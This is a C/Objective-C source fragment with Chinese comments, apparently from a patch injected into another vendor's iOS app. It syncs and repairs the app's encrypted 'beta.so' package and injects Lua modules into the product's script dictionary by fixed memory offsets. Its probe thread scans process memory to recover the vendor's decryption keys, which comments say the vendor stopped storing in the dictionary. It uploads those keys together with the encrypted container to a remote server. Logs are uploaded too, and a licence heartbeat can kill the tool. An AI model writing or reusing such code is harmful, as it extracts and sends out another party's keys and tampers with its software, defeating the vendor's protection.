        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        if (k >= n || j[k] != '"') continue;
        k++;
        int ok = 1;
        for (int t = 0; t < 6; t++) {
            char c = (k + (size_t)t < n) ? (char)j[k + t] : 0;
            if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f'))) { ok = 0; break; }
            out[t] = c;
        }
        if (!ok) continue;                            // 例如 ver_dot 的 "3.0.0" 会在这被拒
        out[6] = 0;
        return 1;
    }
    return 0;
}

/// 在 JSON 里找 "<key>": true（纯 C）。用于 has_key —— 云端没该版本密钥就不该拉包。
static int bs_json_has_true(const unsigned char *j, size_t n, const char *key) {
    size_t kl = strlen(key);
    for (size_t i = 0; i + kl + 3 < n; i++) {
        if (j[i] != '"') continue;
        if (memcmp(j + i + 1, key, kl) != 0) continue;
        if (j[i + 1 + kl] != '"') continue;
        size_t k = i + 2 + kl;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        if (k >= n || j[k] != ':') continue;
        k++;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        return (k + 4 <= n && memcmp(j + k, "true", 4) == 0) ? 1 : 0;
    }
    return 0;
}

/// ★ v6.23o：从服务端 JSON 里抠 "<key>": "<字符串值>"（纯 C）。
///   用于 /ver 应答的 "md5" 字段（script_latest 早就返回了，一直没人用）。
///   语义同 bs_json_pick_ver：键名精确匹配（前后引号），容忍冒号两侧空白。
///   值最多写 outsz-1 字节；成功返回 1。
static int bs_json_pick_str(const unsigned char *j, size_t n, const char *key,
                            char *out, size_t outsz) {
    if (!out || outsz < 2) return 0;
    size_t kl = strlen(key);
    for (size_t i = 0; i + kl + 3 < n; i++) {
        if (j[i] != '"') continue;
        if (memcmp(j + i + 1, key, kl) != 0) continue;
        if (j[i + 1 + kl] != '"') continue;          // 键名必须整段命中
        size_t k = i + 2 + kl;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        if (k >= n || j[k] != ':') continue;
        k++;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        if (k >= n || j[k] != '"') continue;
        k++;
        size_t t = 0;
        while (k < n && j[k] != '"' && j[k] != '\n') {
            if (t + 1 < outsz) out[t++] = (char)j[k];
            k++;
        }
        if (k >= n || j[k] != '"') continue;         // 没闭合引号 = 不是干净字符串
        out[t] = 0;
        return 1;
    }
    return 0;
}

/// ★ v6.23n：beta.so 下载统一走这里（中继优先 → 云端回退 → 体积校验）。
///   原 bs_so_sync_once 内联逻辑抽出，容器修复（v6.23n）复用同一条路。
///   成功返回缓冲（调用方 free）并写 *outn；失败返回 NULL。
static unsigned char *bs_dl_beta_relay(const char *ip, int port,
                                       const char *ver, size_t *outn) {
    // ★ v6.9→v6.13：下载走局域网中继（app.plist 中控 ip，每次现读）；
    //   conf sohost 仅应急覆盖；app.plist 缺失 → 直连云端。
    char appip_now[64];
    bs_pc_ip_of_plist(appip_now, sizeof(appip_now));
    const char *dip;
    int dport;
    if (g_sohost[0]) {
        dip = g_sohost;
        dport = (g_soport > 0) ? g_soport : port;
        bs_log("[so] download via relay %s:%d (conf sohost)", dip, dport);
    } else if (appip_now[0]) {
        dip = appip_now;
        dport = (g_soport > 0) ? g_soport : SO_PORT_DEF;
        bs_log("[so] download via relay %s:%d (app.plist)", dip, dport);
    } else {
        dip = ip;
        dport = port;
    }
    char surl[512];
    if (g_token[0])
        snprintf(surl, sizeof(surl), "http://%s:%d/script/beta.so?ver=%s&key=%s",
                 dip, dport, ver, g_token);
    else
        snprintf(surl, sizeof(surl), "http://%s:%d/script/beta.so?ver=%s",
                 dip, dport, ver);

    // ★ v6.8：大文件下载必须长超时；★ v6.12：中继失败自动回退直连云端
    size_t sn = 0;
    unsigned char *so = bs_http_get_ex_tmo(surl, &sn, NULL, SO_DL_TMO_REQ, SO_DL_TMO_RES);
    if (dip != ip && (!so || sn < SO_MIN_BYTES || sn > SO_MAX_BYTES)) {
        bs_log("[so] relay %s:%d failed (got %lu B) -> retry cloud %s:%d",
               dip, dport, (unsigned long)sn, ip, port);
        if (so) { free(so); so = NULL; }
        if (g_token[0])
            snprintf(surl, sizeof(surl), "http://%s:%d/script/beta.so?ver=%s&key=%s",
                     ip, port, ver, g_token);
        else
            snprintf(surl, sizeof(surl), "http://%s:%d/script/beta.so?ver=%s",
                     ip, port, ver);
        so = bs_http_get_ex_tmo(surl, &sn, NULL, SO_DL_TMO_REQ, SO_DL_TMO_RES);
    }
    if (!so || sn < SO_MIN_BYTES || sn > SO_MAX_BYTES) {
        bs_log("[so] bad size %lu (min=%lu max=%lu) -> abort",
               (unsigned long)sn, (unsigned long)SO_MIN_BYTES,
               (unsigned long)SO_MAX_BYTES);
        if (so) { free(so); so = NULL; }
        return NULL;
    }
    *outn = sn;
    return so;
}

/// ★ v6.23n：beta.so 落盘成功后的处理 —— ★ v6.24q：自动重启彻底移除（用户指令：
///   新 so 只落盘，脚本下次手动运行时自然加载；verwatch 按盘上版本预铺密钥，
///   手动运行即可解开新包）。
/// ★ v6.24r：首次运行/bootstrap —— 状态文件不存在时，用盘上现有 beta.so 的
///   md5 建基线（pend=0，视为「当前盘上的包就是内存里/下次会加载的包」）。
///   动机：全网 495 台里绝大多数不会在本次换包后立刻有动作，若状态缺失就一直
///   显示 so=unknown；补基线后远程能直接读到「这台盘上是 842cabc4 还是 c2ead84e」。
static void bs_so_state_bootstrap(void) {
    if (bs_so_state_read(NULL, 0, NULL, NULL, NULL)) return;
    FILE *f = fopen(DATA_DIR "/beta.so", "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0 || sz > (8L << 20)) { fclose(f); return; }
    unsigned char *b = (unsigned char *)malloc((size_t)sz);
    if (!b) { fclose(f); return; }
    size_t rn = fread(b, 1, (size_t)sz, f);
    fclose(f);
    if (rn == (size_t)sz) {
        char md5[40] = {0};
        bs_md5_buf(b, rn, md5, sizeof(md5));
        bs_so_state_write(0, md5, sz);
        bs_evt("[so] state bootstrap: on-disk md5=%s size=%ld -> pend=0", md5, sz);
    }
    free(b);
}

static void bs_so_maybe_reload(const char *verhex, const unsigned char *buf, size_t n) {
    (void)verhex;
    char md5[40] = {0};
    if (buf && n) bs_md5_buf(buf, n, md5, sizeof(md5));
    // ★ v6.24r：落盘即打 pend=1 —— 远程一眼看出「盘上新的、内存旧的」
    bs_so_state_write(1, md5, (long)n);
    bs_evt("[so] new so on disk -> pend=1 (loads on next script start; md5=%s size=%lu)",
           md5, (unsigned long)n);
}

// ★★★ v6.23n：脏容器自愈（外网机 nm=1005「加载运行库出错」实锤驱动）。
//   厂商通道会给 App 拉到捆了无键远古段的变体容器（12 段 7 无键），
//   App 加载运行库解密失败；云端 probe 分发的同版本号包是干净的，
//   尺寸可能相同 → so_sync 只升不降永远不触发。这里在「版本一致」时
//   主动体检：逐段查键（字典已有零开销；缺 → 云端 /key bypass 现查），
//   存在字典+云端都无键的段 = 永久解不开 → 按当前版本号重拉覆盖。
#define SO_REPAIR_COOLDOWN   3600    // 修复尝试冷却（秒），防下载打爆
static time_t g_so_repair_last = 0;

/// 两个 32 位 hex 串大小写不敏感比较（云端 json 小写，本地自实现 md5 也小写，
/// 保险起见仍按不敏感比）。相等返回 0。
static int bs_hexieq(const char *a, const char *b) {
    for (int i = 0; i < 32; i++) {
        char ca = a[i], cb = b[i];
        if (ca >= 'A' && ca <= 'F') ca += 32;
        if (cb >= 'A' && cb <= 'F') cb += 32;
        if (ca != cb) return 1;
        if (!ca) return 0;
    }
    return 0;
}

/// ★ v6.23o：按版本号重拉干净包并落盘（容器修复的唯一执行体）。
///   want_md5 非空时 = md5 强制模式（v6.23o）：下载体 md5 必须命中云端 /ver
///   报的值才落盘 —— 防止中继缓存陈旧包与云端来回打架。
///   冷却在入口统一判（成功/干净由调用方复位）。
static void bs_so_repair_pull(const char *ip, int port, const char *verhex,
                              const char *want_md5) {
    time_t now = time(NULL);
    if (g_so_repair_last && now - g_so_repair_last < SO_REPAIR_COOLDOWN) return;
    g_so_repair_last = now;

    size_t sn = 0;
    unsigned char *so = bs_dl_beta_relay(ip, port, verhex, &sn);
    if (!so) {
        bs_log("[so] repair: download failed -> keep local, cooldown %ds",
               SO_REPAIR_COOLDOWN);
        return;
    }

    // ★ 防错版：包头 [类型 1B][版本 3B] 必须等于请求版本
    unsigned char want[3];
    bs_hex3(verhex, want);
    if (memcmp(so + 1, want, 3) != 0) {
        bs_log("[so] repair: header ver mismatch (%02x%02x%02x != %s) -> abort",
               so[1], so[2], so[3], verhex);
        free(so);
        return;
    }

    // ★ v6.23o md5 闸门：下载体必须和云端 /ver 报的 md5 一致
    if (want_md5 && want_md5[0]) {
        char got[36];
        bs_md5_buf(so, sn, got, sizeof(got));
        if (bs_hexieq(got, want_md5) != 0) {
            bs_log("[so] repair: download md5 %s != cloud %s -> abort (relay stale?)",
                   got, want_md5);
            free(so);
            return;
        }
        bs_log("[so] repair: download md5 verified (%s)", got);
    }

    // 键闸门（v6.18 同款）：新包逐版本 ensure，任何一把不到手就不落盘
    //   —— 云端包若同样捆了无键段，宁可保留现场也不切换。
    unsigned char gv[EK_VERS_MAX][3];
    int gvn = bs_scan_so_vers(so, sn, gv, EK_VERS_MAX);
    if (gvn > 0) {
        for (int i = 0; i < gvn; i++) {
            char vh[8];
            snprintf(vh, sizeof(vh), "%02x%02x%02x", gv[i][0], gv[i][1], gv[i][2]);
            if (!bs_ensure_extra_key(g_base, vh, 1)) {
                bs_log("[so] repair gate: key %s unavailable (cloud pkg dirty too?) -> keep local", vh);
                free(so);
                return;
            }
        }
    }

    if (bs_write_file_atomic(DATA_DIR "/beta.so", so, sn)) {
        if (want_md5 && want_md5[0])
            bs_evt("[so] ★★ container repaired (md5 verified): clean ver=%s (%lu B) written",
                   verhex, (unsigned long)sn);
        else
            bs_evt("[so] ★★ container repaired: clean ver=%s (%lu B) written",
                   verhex, (unsigned long)sn);
        g_so_repair_last = 0;
        bs_so_maybe_reload(verhex, so, sn);
    }
    free(so);
}

static void bs_so_repair_if_dirty(const char *ip, int port, const char *verhex) {
    if (!g_base) return;
    int nv = bs_refresh_so_vers();               // 文件没变走缓存，零 IO
    if (nv <= 0) return;

    // 体检：每个段版本确保有键。① 字典已有 → 1（零开销，verwatch 早已注入）
    // ② 缺 → 云端 /key 现查并顺手注入（bypass=1 必须新鲜结论）
    int still = 0, total = 0;
    char first_missing[8] = "?";
    for (int i = 0; i < nv; i++) {
        char vh[8];
        snprintf(vh, sizeof(vh), "%02x%02x%02x",
                 g_ek_vers[i][0], g_ek_vers[i][1], g_ek_vers[i][2]);
        total++;
        if (!bs_ensure_extra_key(g_base, vh, 1)) {
            if (still == 0) snprintf(first_missing, sizeof(first_missing), "%s", vh);
            still++;
        }
    }
    if (still == 0) {                            // 全键：干净（含刚补齐/刚修好）
        g_so_repair_last = 0;
        return;
    }

    bs_evt("[so] ★ dirty container: %d/%d vers keyless (first=%s, cloud 404) -> repair pull ver=%s",
           still, total, first_missing, verhex);
    bs_so_repair_pull(ip, port, verhex, NULL);
}

/// 单轮跟版检查。无变化/够不着云端时静默返回（只在真正动作时打日志）。
static void bs_so_sync_once(void) {
    char lver[8] = {0};
    if (!bs_read_beta_ver(lver, sizeof(lver))) {
        bs_log("[so] local beta.so unreadable -> skip sync");
        return;
    }
    char ip[128] = {0};
    if (!bs_get_host_c(ip, sizeof(ip))) {
        bs_log("[so] no host -> skip sync");
        return;
    }

    char url[512];
    if (g_token[0])
        snprintf(url, sizeof(url), "http://%s:%d%s?prj=%s&key=%s",
                 ip, g_port, SO_VER_PATH, BS_PRJ, g_token);
    else
        snprintf(url, sizeof(url), "http://%s:%d%s?prj=%s",
                 ip, g_port, SO_VER_PATH, BS_PRJ);

    size_t n = 0;
    unsigned char *b = bs_http_get_c(url, &n);
    if (!b || n == 0) { if (b) free(b); return; }     // 连不上就等下一轮，不刷日志

    char cver[8] = {0};
    int have_ver = bs_json_pick_ver(b, n, cver, sizeof(cver));
    int has_key  = bs_json_has_true(b, n, "has_key");
    // ★ v6.23o：顺手抓云端报的容器 md5（必须在 free(b) 前）
    char wmd5[36] = {0};
    int have_md5 = bs_json_pick_str(b, n, "md5", wmd5, sizeof(wmd5));
    free(b);

    if (!have_ver) { bs_log("[so] /ver parse failed -> skip"); return; }
    if (strcmp(cver, lver) == 0) {                    // 已是最新
        // ★ v6.23o：md5 强制比对 —— 厂商通道/App 会在同版本号下整包换载荷
        //   （1005 实锤：人工覆盖干净包 2h 内又被换回变体；变体可全键但
        //   lua 内容坏，键体检抓不住）。云端 /ver 自带 md5，本地不符 = 被换包
        //   → 按 md5 重拉（下载体也要 md5 命中才落盘）。
        if (have_md5 && wmd5[0]) {
            char lmd5[36] = {0};
            if (bs_md5_file(DATA_DIR "/beta.so", lmd5, sizeof(lmd5)) &&
                bs_hexieq(lmd5, wmd5) != 0) {
                bs_evt("[so] ★ md5 mismatch: local %s != cloud %s -> repair pull ver=%s",
                       lmd5, wmd5, cver);
                bs_so_repair_pull(ip, g_port, cver, wmd5);
                return;
            }
        }
        // ★ v6.23n：版本一致也要验容器健康 —— 厂商通道可能给 App 拉到捆了
        //   无键远古段的「脏容器」（1005 实锤），尺寸与云端干净包相同时
        //   so_sync「只升不降」永远不触发，必须在这里主动体检+自愈。
        bs_so_repair_if_dirty(ip, g_port, cver);
        return;
    }
    if (strcmp(cver, lver) < 0) {                     // 只升不降
        bs_log("[so] cloud %s < local %s -> keep local", cver, lver);
        return;
    }
    if (!has_key) {
        // ★ 云端有包但密钥还没上架：拉了也解不开，等人工/真卡机把密钥补上
        bs_log("[so] cloud %s has NO key yet -> wait", cver);
        return;
    }

    bs_evt("[so] cloud %s > local %s -> downloading", cver, lver);
    // ★ v6.23n：下载逻辑抽到 bs_dl_beta_relay（中继优先→云端回退→体积校验），
    //   与容器修复共用同一条路；app.plist 现读/sohost 覆盖/长超时都在 helper 里。
    size_t sn = 0;
    unsigned char *so = bs_dl_beta_relay(ip, g_port, cver, &sn);
    if (!so) return;

    // ★ 防错版：包头是 [类型 1B][版本 3B]，版本必须等于我们请求的版本
    unsigned char want[3];
    bs_hex3(cver, want);
    if (memcmp(so + 1, want, 3) != 0) {
        bs_log("[so] header ver mismatch (%02x%02x%02x != %s) -> abort",
               so[1], so[2], so[3], cver);
        free(so);
        return;
    }

    // ★★★ v6.18：键闸门 —— 新包段流里每个版本键都必须先到手才允许落盘切版。
    //   3.0.5 教训：云端 /ver 报 has_key 只看**头版本**键；包内 lua 记录自带
    //   030002~030005 各版本键，切了包键没到 → `can not find version key!!`
    //   → 脚本起不来，还得人工回滚。现在：逐版本 ensure（取到即顺手注入预热），
    //   任何一把 MISS → 不落盘、保持旧包，等 sotick 下一轮重试。
    //   扫描结果为 0（格式异常游走失败）→ 保守放行（打警告），行为退回 v6.17。
    unsigned char gv[EK_VERS_MAX][3];
    int gvn = bs_scan_so_vers(so, sn, gv, EK_VERS_MAX);
    if (gvn == 0) {
        bs_log("[so] WARN: scan new beta.so got 0 vers (format changed?) -> gate pass-through");
    } else {
        int gate_ok = 1;
        for (int i = 0; i < gvn && gate_ok; i++) {
            char vh[8];
            snprintf(vh, sizeof(vh), "%02x%02x%02x", gv[i][0], gv[i][1], gv[i][2]);
            // base=g_base：取到键直接注入预热；g_base 尚无（极早期）也允许只验云端
            if (!bs_ensure_extra_key(g_base, vh, 1)) {
                bs_log("[so] gate: key %s not available -> keep local %s, retry next tick",
                       vh, lver);
                gate_ok = 0;
            }
        }
        if (!gate_ok) { free(so); return; }
        if (gvn > 2)
            bs_log("[so] gate passed: %d vers all keyed", gvn);
    }

    if (bs_write_file_atomic(DATA_DIR "/beta.so", so, sn)) {
        bs_evt("[so] ★ beta.so updated %s -> %s (%lu B)", lver, cver, (unsigned long)sn);
        // ★ v6.7 在跑→重启 / 没在跑→只落盘；v6.23n 抽到 bs_so_maybe_reload 复用
        bs_so_maybe_reload(cver, so, sn);
    }
    free(so);
}

/// 跟版线程：首轮延迟 20s（等 App 网络栈就绪），之后每 g_so_tick 秒复查一次。
static void *bs_so_sync_thread(void *arg) {
    (void)arg;
    bs_evt("[so] sync thread start tick=%ds sosync=%d host=%s:%d",
           g_so_tick, g_so_sync, g_host, g_port);
    sleep(SO_SYNC_FIRST_DELAY);
    for (;;) {
        if (g_so_sync) bs_so_sync_once();
        sleep((unsigned)g_so_tick);
    }
    return NULL;
}

/// probe 线程：版本 → 密钥 → 组帧 → POST /probe。
///   幂等设计：与上次成功上报同版本则本轮静默（不重复传 1MB 包）。
static void *bs_probe_thread(void *arg) {
    uintptr_t base = (uintptr_t)arg;
    bs_log("[probe] ★ radar starting tick=%ds host=%s:%d prj=%s token=%s",
           PROBE_TICK_SECS, g_host, g_port, BS_PRJ, g_token[0] ? "(set)" : "(none)");
    sleep(PULL_FIRST_DELAY);

    char last_ver[8] = {0};
    int  last_ok = 0;

    for (;;) {
        char verhex[8] = {0};
        if (!bs_read_beta_ver(verhex, sizeof(verhex))) {
            sleep(PROBE_TICK_SECS);
            continue;
        }

        // 与上次成功上报一致 -> 静默（但每 tick 仍会重读快照，防止版本回退后漏报）
        if (last_ok && strcmp(last_ver, verhex) == 0) {
            sleep(PROBE_TICK_SECS);
            continue;
        }

        // 重读字典（App 可能启动后才拿到密钥；也可能新增了别的版本）
        @autoreleasepool { bs_mh_snapshot(base); }

        unsigned char want[3];
        bs_hex3(verhex, want);
        unsigned char *val = NULL;
        for (int i = 0; i < g_mh_n; i++) {
            if (!memcmp(g_mh_snap[i], want, 3)) { val = g_mh_snap[i] + 3; break; }
        }
        if (!val) {
            // ★ v6.23q keyhunt：字典缺失 -> 扫本进程内存找回（厂商 3.0.9 起密钥不进字典）
            unsigned char kh_key[32];
            if (kh_keyhunt(want, kh_key)) {
                bs_log("[keyhunt] ★★ FOUND ver=%02x%02x%02x key=%02x%02x%02x%02x%02x%02x%02x%02x... -> 走常规上报",
                       want[0], want[1], want[2],
                       kh_key[0], kh_key[1], kh_key[2], kh_key[3],
                       kh_key[4], kh_key[5], kh_key[6], kh_key[7]);
                if (g_mh_n < MH_SNAP_MAX) {
                    memcpy(g_mh_snap[g_mh_n], want, 3);
                    memcpy(g_mh_snap[g_mh_n] + 3, kh_key, 32);
                    val = g_mh_snap[g_mh_n] + 3;
                    g_mh_n++;
                } else {
                    val = kh_key;      // 快照满：本轮直接用栈上副本
                }
            }
        }
        if (!val) {
            bs_log("[probe] ver=%s not in dict yet (n=%d) -> retry next tick", verhex, g_mh_n);
            sleep(PROBE_TICK_SECS);
            continue;
        }

        // 读本地 beta.so（只在确实要上报时才读，平时零 IO）
        unsigned char *so = NULL;
        size_t solen = 0;
        if (!bs_read_file(DATA_DIR "/beta.so", &so, &solen)) {
            bs_log("[probe] read beta.so failed errno=%d", errno);
            sleep(PROBE_TICK_SECS);
            continue;
        }

        // 组帧：BSPR | klen=3 | ver(3) | val(32) | solen(4, BE) | so
        size_t blen = 44 + solen;
        unsigned char *frame = (unsigned char *)malloc(blen);
        if (!frame) { free(so); sleep(PROBE_TICK_SECS); continue; }
        memcpy(frame, "BSPR", 4);
        frame[4] = 3;
        memcpy(frame + 5, want, 3);
        memcpy(frame + 8, val, 32);
        frame[40] = (unsigned char)((solen >> 24) & 0xff);
        frame[41] = (unsigned char)((solen >> 16) & 0xff);
        frame[42] = (unsigned char)((solen >> 8) & 0xff);
        frame[43] = (unsigned char)(solen & 0xff);
        memcpy(frame + 44, so, solen);
        free(so);

        char ip[128] = {0};
        if (!bs_get_host_c(ip, sizeof(ip))) {
            bs_log("[probe] no host -> skip");
            free(frame);
            sleep(PROBE_TICK_SECS);
            continue;
        }
        char url[512];
        if (g_token[0])
            snprintf(url, sizeof(url), "http://%s:%d%s?key=%s&prj=%s",
                     ip, g_port, PROBE_PATH, g_token, BS_PRJ);
        else
            snprintf(url, sizeof(url), "http://%s:%d%s?prj=%s",
                     ip, g_port, PROBE_PATH, BS_PRJ);

        size_t rn = 0;
        long code = 0;
        unsigned char *rb = bs_http_post_ex(url, "application/octet-stream",
                                            frame, blen, &rn, &code);
        if (rb && code == 200) {
            last_ok = 1;
            snprintf(last_ver, sizeof(last_ver), "%s", verhex);
            bs_log("[probe] ★ report OK ver=%s so=%luB resp=%.64s",
                   verhex, (unsigned long)solen, (const char *)rb);
        } else {
            last_ok = 0;
            bs_log("[probe] report FAIL ver=%s code=%ld", verhex, code);
        }
        if (rb) free(rb);
        free(frame);
        sleep(PROBE_TICK_SECS);
    }
    return NULL;
}

/// 路线 A 主流程：拉 manifest → 比对 → 下载 → 写盘。返回更新个数（-1 = 失败）
///
/// ★★ 改成「ObjC 只用于网络，其余全纯 C」：
///    - HTTP：用 bs_http_get_c（内部 NSURLSession，但只在**主队列**上同步等，
///      实测该调用在裸线程里是安全的，step5 已验证）
///    - 解析：bs_parse_manifest_c（纯 C 扫描）
///    - 比对 md5 / 读写文件：POSIX（open/read/write/stat）+ 自实现 md5
///    这样彻底避开在裸 pthread 上触碰 NSJSONSerialization / NSFileManager /
///    NSMutableDictionary 这些会触发 runtime 懒加载的类。
static int bs_pull_modules(uintptr_t base) {
    @autoreleasepool {
        bs_log("[pull] step1 enter pull_modules");

        // --- 1) 拿服务端地址（v6.2：内置 BS_HOST_DEF，可被 conf 的 host= 覆盖）
        //        ★ 不再读 app.plist —— 那是 App 连电脑中控用的，与本补丁无关。
        char ip[128] = {0};
        if (!bs_get_host_c(ip, sizeof(ip))) {
            bs_log("[pull] no server host, skip");
            return -1;
        }
        bs_log("[pull] step2 host=%s", ip);

        // --- 2) URL 拼接（纯 C）
        char url[768];   // ★ v6.10 g_qbuf 现含设备信息，512 不够
        const char *q = (g_token[0] != 0) ? g_qbuf : "";
        snprintf(url, sizeof(url), "http://%s:%d/manifest.json%s", ip, g_port, q);
        bs_log("[pull] step3 mfURL=%s", url);

        // --- 3) 拉 manifest（HTTP 用 ObjC，但已验证安全）
        size_t mfLen = 0;
        unsigned char *mfBuf = bs_http_get_c(url, &mfLen);
        bs_log("[pull] step4 http_get len=%lu", (unsigned long)mfLen);
        if (!mfBuf || mfLen == 0) {
            bs_log("[pull] manifest fetch failed");
            if (mfBuf) free(mfBuf);
            return -1;
        }

        // --- 4) 纯 C 解析
        static bs_mod_t mods[BS_MAX_MODS];
        int nmods = bs_parse_manifest_c((const char *)mfBuf, mfLen, mods, BS_MAX_MODS);
        free(mfBuf);
        bs_log("[pull] step5 parse n=%d", nmods);
        if (nmods <= 0) {
            bs_log("[pull] manifest empty/unparsable");
            return -1;
        }

        // --- 5) 确保模块目录存在（POSIX）
        mkdir(g_mod_dir, 0755);

        int updated = 0;
        int checked = 0;
        for (int i = 0; i < nmods; i++) {
            checked++;
            const char *name = mods[i].name;
            char want[40];
            snprintf(want, sizeof(want), "%s", mods[i].md5);
            for (char *c = want; *c; c++) *c = (char)tolower((unsigned char)*c);

            char path[320];
            snprintf(path, sizeof(path), "%s/%s.lua", g_mod_dir, name);

            // 本地已存在且 md5 一致 → 跳过（纯 C 读 + 自实现 md5）
            char have[40] = {0};
            if (bs_md5_file(path, have, sizeof(have)) && !strcmp(have, want)) {
                bs_log("[pull] skip %s (md5 ok)", name);
                continue;
            }

            char murl[512];
            snprintf(murl, sizeof(murl), "http://%s:%d/modules/%s%s", ip, g_port, name, q);
            size_t mlen = 0;
            unsigned char *mbuf = bs_http_get_c(murl, &mlen);
            if (!mbuf || mlen == 0) {
                bs_log("[pull] download failed: %s", name);
                if (mbuf) free(mbuf);
                continue;
            }

            char got[40];
            bs_md5_buf(mbuf, mlen, got, sizeof(got));
            if (strcmp(got, want)) {
                bs_log("[pull] md5 mismatch %s want=%s got=%s", name, want, got);
                free(mbuf);
                continue;
            }

            // POSIX 原子写：先写 .tmp 再 rename
            char tmp[352];
            snprintf(tmp, sizeof(tmp), "%s.tmp", path);
            int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
            int ok = 0;
            if (fd >= 0) {
                ssize_t w = write(fd, mbuf, mlen);
                close(fd);
                if (w == (ssize_t)mlen && rename(tmp, path) == 0) {
                    chmod(path, 0644);
                    ok = 1;
                } else {
                    unlink(tmp);
                }
            }
            free(mbuf);

            if (ok) {
                updated++;
                bs_log("[pull] updated %s (%lu B)", name, (unsigned long)mlen);
            } else {
                bs_log("[pull] write failed: %s", path);
            }
        }

        bs_log("[pull] done checked=%d updated=%d", checked, updated);

        // 有更新 → 重灌 onion 字典（必须回主线程做，见 bs_inject_modules 注释）
        if (updated > 0) {
            bs_request_inject(base);
        }
        return updated;
    }
}

static void *bs_puller(void *arg) {
    uintptr_t base = (uintptr_t)arg;
    bs_log("[pull] puller thread start, base=%p first_delay=%ds tick=%ds",
           (void *)base, PULL_FIRST_DELAY, g_tick);
    sleep(PULL_FIRST_DELAY);
    bs_log("[pull] delay over, entering loop (enable=%d)", g_enable);
    for (;;) {
        bs_log("[pull] loop tick begin");
        @autoreleasepool {
            if (g_enable) {
                // --- (a) 心跳先行：没有授权就不发模块请求 ---
                //  返回值：1=通过  0=网络类失败（计数）  -1=授权类拒绝（立即死）
                int alive = bs_hb_ping(base);
                bs_devlog_upload();   // ★ v6.23k：日志尾部随拍回传云端（失败静默）

                if (alive == 1) {
                    // --- (b) 心跳通过 → 正常拉模块 ---
                    //     ★ v6.20：卡密封禁 → 不拉模块（已注入的也被 watchdog 拒灌）
                    if (g_card_blocked) {
                        bs_log("[pull] skip modules (card blocked)");
                        int r = 0;
                        bs_log("[pull] loop tick end r=%d (card blocked)", r);
                    } else {
                    int r = bs_pull_modules(base);
                    bs_log("[pull] loop tick end r=%d (miss reset)", r);
                    }
                } else if (alive < 0) {
                    // ★ 授权类拒绝（403 / "ok":false）：明确判决，一次都不容忍
                    bs_log("[pull] hb DENIED -> immediate kill");
                    g_hb_ok   = 0;
                    g_hb_miss = g_hb_max;      // 让 killswitch 日志里的计数真实
                    bs_killswitch(base, "heartbeat denied");
                } else {
                    // ★ 网络类失败（连不上/超时/5xx）：计数容忍，抖动不误杀
                    int m = ++g_hb_miss;
                    if (m >= g_hb_max) {
                        bs_log("[pull] hb lost %d/%d -> kill", m, g_hb_max);
                        g_hb_ok = 0;
                        bs_killswitch(base, "heartbeat lost (max misses)");
                        // 保持 g_hb_miss 在阈值，避免死亡期间反复触发 OPER_STOP；
                        // 恢复时由 bs_hb_ping 的成功分支清零。
                    } else {
                        bs_log("[pull] hb miss %d/%d -> tolerate, keep modules",
                               m, g_hb_max);
                    }
                }
            } else {
                bs_log("[pull] disabled, skip");
            }
        }
        sleep(g_tick);
    }
    return NULL;
}

// ---------------------------------------------------------------- 本地模块注入
// 把 /var/mobile/Media/bs_modules/*.lua 逐个灌进产品的 onion 字典。
// 幂等：产品后续若被服务器覆盖也没关系；每次新的 lua_State 都重灌一遍。
//
// ★ 实测（2026-09-26，.47）：字典的 value 类型是 NSData（_NSInlineData），
//   不是 NSString。必须传 NSData，否则 get_script_onion_data 侧取不出来。
static int bs_inject_modules(uintptr_t base) {
    @autoreleasepool {
        NSFileManager *fm = [NSFileManager defaultManager];
        NSArray<NSString *> *files = [fm contentsOfDirectoryAtPath:@(g_mod_dir) error:nil];
        if (files.count == 0) {
            bs_log("[mod] no local modules at %s", g_mod_dir);
            return 0;
        }

        void (*setOnion)(id, id) = (void (*)(id, id))(base + FN_SET_ONION);
        int n = 0;
        for (NSString *f in files) {
            if (![f hasSuffix:@".lua"]) continue;

            NSString *name = [f stringByDeletingPathExtension];
            NSString *path = [@(g_mod_dir) stringByAppendingPathComponent:f];
            NSData *code = [NSData dataWithContentsOfFile:path];
            if (code.length == 0) {
                bs_log("[mod] read failed: %s", f.UTF8String);
                continue;
            }

            setOnion(name, code);
            n++;
            bs_log("[mod] injected %s (%lu bytes)", name.UTF8String,
                   (unsigned long)code.length);
        }

        void *dict = *(void **)(base + OFF_ONION_DICT);
        bs_log("[mod] done n=%d dict=%p", n, dict);
        return n;
    }
}

// ---------------------------------------------------------------- 看门狗
// ★ v6.24d：读文件尾部并统计 needle 出现次数（近因签名判定；只读，不挑格式）
// ★ v6.24h：崩溃证据落盘 marker —— agent.log 在 App 重启时会被轮转清空
//   （10-19 08:10 .216 实测 31MB → 6.4KB），所以任何「扫日志找崩溃证据」的自愈
//   都活不过一次重启：v6.24f/g 的 rage 判定因此恒为 -1。改为崩溃一命中就写
//   持久 marker，脚本跑起来时删除；marker 存在 + st==0 + run==0 = 确认停摆。
//   用户主动停脚本不会命中崩溃签名，故无 marker、不会被误拉。
#define CR_MARK DATA_DIR "/.bs_cr_pending"

static void bs_cr_mark_write(const char *src) {
    FILE *f = fopen(CR_MARK, "w");
    if (!f) return;
    fprintf(f, "ts=%ld src=%s\n", (long)time(NULL), src ? src : "?");
    fclose(f);
}
static void bs_cr_mark_clear(void) { unlink(CR_MARK); }
static long bs_cr_mark_age(void) {          // -1 = 无 marker
    struct stat sb;
    if (stat(CR_MARK, &sb) != 0) return -1;
    long a = (long)(time(NULL) - (time_t)sb.st_mtime);
    return a < 0 ? 0 : a;
}

// ★ v6.24k：用户主动停脚本的「落盘闸门」——v6.24i 只在 agent.log 尾部找字符串，
//   而 App 一重启 agent.log 就被轮转（31MB→6.4KB 实测），闸门随即失效；
//   且下面 bs_last_stop_is_user 用的串跟厂商真实日志对不上（见其注释）。
//   这里改为：只要观测到 run 1->0（且不是 reload / 卡封禁 / 崩溃签名），
//   就写一个持久 marker；marker 存在期间**禁止一切自动 OPER_START**，
//   直到再次看到 run==1（= 中控下发了「运行」）。
//   ★ 优先级：崩溃证据 > 用户停止。若同一拍扫到 run-error 签名，清 marker 走恢复。
#define US_MARK DATA_DIR "/.bs_userstop"
